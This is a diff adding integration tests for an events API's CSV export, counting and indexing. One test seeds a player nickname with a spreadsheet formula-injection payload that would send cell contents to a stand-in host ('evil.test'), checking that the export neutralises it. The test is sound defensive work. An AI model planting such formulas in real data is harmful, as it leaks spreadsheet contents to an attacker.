@@ -1,7 +1,8 @@
 import type { DatabaseClient } from '@squad/db';
 import { events, playerApiTokens, players, roles, servers } from '@squad/db/schema';
+import { sql } from 'drizzle-orm';
 import { v7 as uuidv7 } from 'uuid';
-import { afterAll, beforeAll, describe, expect, it } from 'vitest';
+import { afterAll, beforeAll, describe, expect, it, vi } from 'vitest';
 import { mintApiToken } from '../src/lib/api-tokens.js';
 import { invalidatePermissionCache } from '../src/lib/rbac.js';
 import { createSession } from '../src/lib/sessions.js';
@@ -340,6 +341,50 @@ describeIfDb('events API (EVT-2)', () => {
     expect(res.json()).toMatchObject({ error: 'invalid_cursor' });
   });
 
+  it('neutralises spreadsheet formulas in the CSV export (#154)', async () => {
+    const server = await seedServer(h.db, 'EvtCsvFormulaSrv');
+    const formulaNick = `=HYPERLINK("http://evil.test/?"&A1,"x${uuidv7().slice(0, 6)}")`;
+    const actor = await seedPlayer(h.db, { name: formulaNick });
+    await seedEvent(h.db, { serverId: server, occurredAt: at(85), actorId: actor });
+
+    const res = await h.app.inject({
+      method: 'GET',
+      url: `/api/v1/events/export?serverId=${server}`,
+      headers: { cookie },
+    });
+    expect(res.statusCode).toBe(200);
+    expect(res.body).toContain(`"'${formulaNick.replace(/"/g, '""')}"`);
+    expect(res.body).not.toContain(`,"${formulaNick.replace(/"/g, '""')}"`);
+  });
+
+  it('exports every matching row newest first across export batches', async () => {
+    const server = await seedServer(h.db, 'EvtCsvBatchSrv');
+    const total = 1_203;
+    await h.db.insert(events).values(
+      Array.from({ length: total }, (_, index) => ({
+        eventId: uuidv7(),
+        serverId: server,
+        occurredAt: new Date(at(90).getTime() + index * 1_000),
+        kind: 'player.connected',
+        version: 1,
+        payload: { seq: index },
+      })),
+    );
+
+    const res = await h.app.inject({
+      method: 'GET',
+      url: `/api/v1/events/export?serverId=${server}`,
+      headers: { cookie },
+    });
+    expect(res.statusCode).toBe(200);
+    const lines = res.body.trimEnd().split('\r\n');
+    expect(lines).toHaveLength(total + 1);
+    const seqs = lines.slice(1).map((line) => Number(/seq"":(\d+)/.exec(line)?.[1]));
+    expect(seqs[0]).toBe(total - 1);
+    expect(seqs.at(-1)).toBe(0);
+    expect(new Set(seqs).size).toBe(total);
+  });
+
   it('counts events honoring filters', async () => {
     const server = await seedServer(h.db, 'EvtCountSrv');
     await seedEvent(h.db, { serverId: server, occurredAt: at(80), kind: 'player.connected' });
@@ -352,6 +397,76 @@ describeIfDb('events API (EVT-2)', () => {
     });
     expect(res.statusCode).toBe(200);
     expect(res.json()).toMatchObject({ total: 1 });
+  });
+
+  it('counts an unfiltered feed exactly while the table is small', async () => {
+    const res = await h.app.inject({
+      method: 'GET',
+      url: '/api/v1/events/count',
+      headers: { cookie },
+    });
+    expect(res.statusCode).toBe(200);
+    const [row] = (await h.db.execute(
+      sql`SELECT count(*)::int AS total FROM events`,
+    )) as unknown as Array<{ total: number }>;
+    expect(res.json()).toEqual({ total: row?.total, estimated: false });
+  });
+
+  it('answers an unfiltered count on a large table with the planner estimate (#152)', async () => {
+    const execute = vi
+      .spyOn(h.db, 'execute')
+      .mockResolvedValueOnce([{ estimate: 12_345_678 }] as never);
+    try {
+      const res = await h.app.inject({
+        method: 'GET',
+        url: '/api/v1/events/count',
+        headers: { cookie },
+      });
+      expect(res.statusCode).toBe(200);
+      expect(res.json()).toEqual({ total: 12_345_678, estimated: true });
+    } finally {
+      execute.mockRestore();
+    }
+  });
+
+  it('indexes the feed order, the rule filter and nickname search (#152, #153, #1325)', async () => {
+    const rows = (await h.db.execute(sql`
+      SELECT indexname FROM pg_indexes
+      WHERE schemaname = current_schema()
+        AND indexname IN (
+          'events_occurred_at_event_id_idx',
+          'events_rule_id_idx',
+          'players_canonical_name_normalized_trgm_idx',
+          'player_name_history_name_normalized_trgm_idx'
+        )
+    `)) as unknown as Array<{ indexname: string }>;
+    expect(rows.map((row) => row.indexname).sort()).toEqual([
+      'events_occurred_at_event_id_idx',
+      'events_rule_id_idx',
+      'player_name_history_name_normalized_trgm_idx',
+      'players_canonical_name_normalized_trgm_idx',
+    ]);
+  });
+
+  it('resolves actor nicknames without failing on non-uuid actor ids', async () => {
+    const server = await seedServer(h.db, 'EvtActorIdSrv');
+    const actor = await seedPlayer(h.db, { name: `Medic-${uuidv7().slice(0, 6)}` });
+    const withPlayer = await seedEvent(h.db, {
+      serverId: server,
+      occurredAt: at(95),
+      actorId: actor,
+    });
+    const withLabel = await seedEvent(h.db, {
+      serverId: server,
+      occurredAt: at(96),
+      actorKind: 'system',
+      actorId: 'scheduler',
+    });
+
+    const page = await listEvents(`?serverId=${server}`);
+    const byId = new Map(page.items.map((event) => [event.event_id, event]));
+    expect(byId.get(withPlayer)?.actor_nickname).toContain('Medic-');
+    expect(byId.get(withLabel)?.actor_nickname).toBeNull();
   });
 
   it('returns the raw envelope with payload (AC)', async () => {
